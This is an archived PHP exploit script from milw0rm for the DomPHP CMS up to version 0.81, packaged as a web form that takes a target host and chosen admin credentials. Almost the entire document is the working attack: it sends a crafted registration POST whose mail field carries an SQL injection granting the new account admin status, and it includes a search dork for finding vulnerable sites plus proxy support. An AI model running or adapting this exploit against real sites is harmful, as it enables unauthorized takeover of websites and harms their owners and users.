<html><head><title>DomPHP <= 0.81 Remote Add Administrator Exploit</title></head><pre>&lt;?php
/*
 *    DomPHP &lt;= 0.81 Remote Add Administrator Exploit
 *    c0ded by j0j0
 *    dork: &quot;Site créé à l'aide du CMS DomPHP&quot;
 *
 *    Exploit work with CURL
*/

error_reporting(0);
ini_set('max_execution_time', 0);
ini_set('default_socket_timeout', 5);
ob_implicit_flush(true);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
    $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
    }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}


class exploit {
    function connect($host,$port=80) {
        echo '[*] Trying to connect to '.$host.':'.$port.'... ';
        $fp = @fsockopen($host, $port, $errno, $errstr, 4);
        switch($fp) {
            case true: echo 'OK'; break;
            case false: echo 'ERROR'; break;
        }
        echo '&lt;br /&gt;'.&quot;\n&quot;;
        return $fp;
    }
}
?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;style type=&quot;text/css&quot;&gt;
body {
    margin:3%;
    font-size:10px;
    color:#FFFFFF;
    font-family:Verdana,Arial;
    background-color:#1a1a1a;
    text-align: center;
}
input {
    background:#303030;
    color:#FFFFFF;
    font-family:Verdana,Arial;
    font-size:10px;
    vertical-align:middle;
    border-left:1px solid #5d5d5d;
    border-right:1px solid #121212;
    border-bottom:1px solid #121212;
    border-top:1px solid #5d5d5d;
    padding: 3px;
    margin: 2px;
}
input[type=text] {
    width: 200px;
}
textarea {
    background:#303030;
    color:#FFFFFF;
    font-family:Verdana,Arial;
    font-size:10px;
    vertical-align:middle;
    border-left:1px solid #121212;
    border-right:1px solid #5d5d5d;
    border-bottom:1px solid #5d5d5d;
    border-top:1px solid #121212;
}
table td {
    font-size: 10px;
    font-family: Verdana, Arial;
}
h3 { color: #CC0000; }
a {
    color: #999999;
    text-decoration: none;
    font-weight: bold;
}
#exploit {
    font-family: Courier New, sans-ms;
    font-size: 12px;
    color: #00FF00;
    width: 400px;
    text-align: left;
}
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h3&gt;DomPHP &lt;= 0.81 Remote Add Administrator Exploit&lt;br /&gt;&lt;br /&gt;-= c0ded by j0j0 =-&lt;/h3&gt;
&lt;br /&gt;
&lt;center&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;ul&gt;
# Download'&gt;http://&quot;&gt;Download DomPHP 0.81

# Visit'&gt;http://&quot;&gt;Visit DomPHP Website

&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/center&gt;
&lt;br /&gt;
&lt;form method=&quot;post&quot; action=&quot;domphp.php&quot;&gt;
&lt;?php
$host = isset($_POST['host']) ? $_POST['host'] : 'localhost';
$proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
$path = isset($_POST['path']) ? $_POST['path'] : '/domphp/';
$version = isset($_POST['version']) ? $_POST['version'] : '0.81';
$newAdminUsername = isset($_POST['newAdminUsername']) ? $_POST['newAdminUsername'] : 'j0j0';
$newAdminPassword = isset($_POST['newAdminPassword']) ? $_POST['newAdminPassword'] : 'h4ck3d';
?&gt;
&lt;center&gt;
&lt;table&gt;
&lt;tr&gt;
    &lt;td&gt;Host :&lt;/td&gt;
    &lt;td&gt;&lt;input name=&quot;host&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $host; ?&gt;&quot; /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;Proxy* :&lt;/td&gt;
    &lt;td&gt;&lt;input name=&quot;proxy&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $proxy; ?&gt;&quot; /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;Path to DomPHP :&lt;/td&gt;
    &lt;td&gt;&lt;input name=&quot;path&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $path; ?&gt;&quot; /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;DomPHP Version :&lt;/td&gt;
    &lt;td&gt;&lt;input name=&quot;version&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $version; ?&gt;&quot; /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;New admin username :&lt;/td&gt;
    &lt;td&gt;&lt;input name=&quot;newAdminUsername&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $newAdminUsername; ?&gt;&quot; /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;New admin password :&lt;/td&gt;
    &lt;td&gt;&lt;input name=&quot;newAdminPassword&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $newAdminPassword; ?&gt;&quot; /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;/td&gt;
    &lt;td&gt;&lt;input name=&quot;xpl&quot; type=&quot;submit&quot; value=&quot;Send Exploit&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;i&gt;* : opptional&lt;/i&gt;
&lt;/center&gt;
&lt;/form&gt;

&lt;br /&gt;
&lt;?php
if($_POST['xpl']) {
$err=0;
foreach($_POST as $key=&gt;$value) {
    if(empty($value) &amp;&amp; $key != 'proxy') {
        echo $key .' is empty !&lt;br /&gt;';
        $err++;
    }
}
if($err &gt; 0) { die(); }
extract($_POST);

echo '&lt;center&gt;'.&quot;\n&quot;.'&lt;div id=&quot;exploit&quot;&gt;'.&quot;\n&quot;;

while(exploit::connect($host, 80) === FALSE) {
/* Try to connect to {$host} */
}

if(!empty($proxy)) {
$proxyHost = parse_url($proxy, PHP_URL_HOST);
$proxyPort = parse_url($proxy, PHP_URL_PORT);
if(empty($proxyHost) || empty($proxyPort)) {
    echo '[*] Bad proxy ! I won\'t use proxy to send exploit.&lt;br /&gt;'.&quot;\n&quot;;
    unset($proxyHost, $proxyPort);
    $proxy = '';
}
else {
    $proxyConnect = exploit::connect($proxyHost, $proxyPort);
    if($proxyConnect === FALSE) {
        echo '[*] Bad proxy ! I won\'t use proxy to send exploit.&lt;br /&gt;'.&quot;\n&quot;;
        unset($proxyHost, $proxyPort);
        $proxy = '';
    }
}
}

$port=80;
$proxy=&quot;&quot;;
for ($i=7; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;)) {$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
if($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

if($version == '0.81') { $pass1 = 1000; $pass2 = 1000; }
else {
    $pass1 = '';
    $pass2 = '';
}

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;prenom&quot;

Dom
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;nom&quot;

PHP
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;mail&quot;

h4ck\', loginUtilisateur=\''.urlencode($newAdminUsername).'\', passUtilisateur=PASSWORD(\''.urlencode($newAdminPassword).'\'), statutUtilisateur=\'admin\', siteUtilisateur=\'\', urlUtilisateur=\'\', descUtilisateur=\'\', metierUtilisateur=\'\', villeUtilisateur=\'\', contact=\'1\' /*
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;newlogin&quot;

j0j0
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;pass1&quot;

'.$pass1.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;pass2&quot;

'.$pass2.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;ville&quot;

DomPHP
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;metier&quot;

hacker
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;site&quot;

google.com
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;url&quot;

http://www.google.com
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;id_utilisateur&quot;


-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;adressemail&quot;


-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;change_pass&quot;


-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;B1&quot;

Envoyer
-----------------------------7d6224c08dc
';

$packet =&quot;POST &quot;.$path.&quot;/welcome/inscription.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Accept-Language: en\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacket($packet);
if(strstr($html, '404 Not Found')) {
    echo '[*] 404 not found :( (certainly the path)';
}
elseif(strstr($html, 'erreur.php')) {
    echo '[*] Exploit failed :(&lt;br /&gt;';
}
else {
    echo '[*] New admin created :)&lt;br /&gt;';
}
}

?&gt;
&lt;/div&gt;
&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2008-01-10]</pre></html>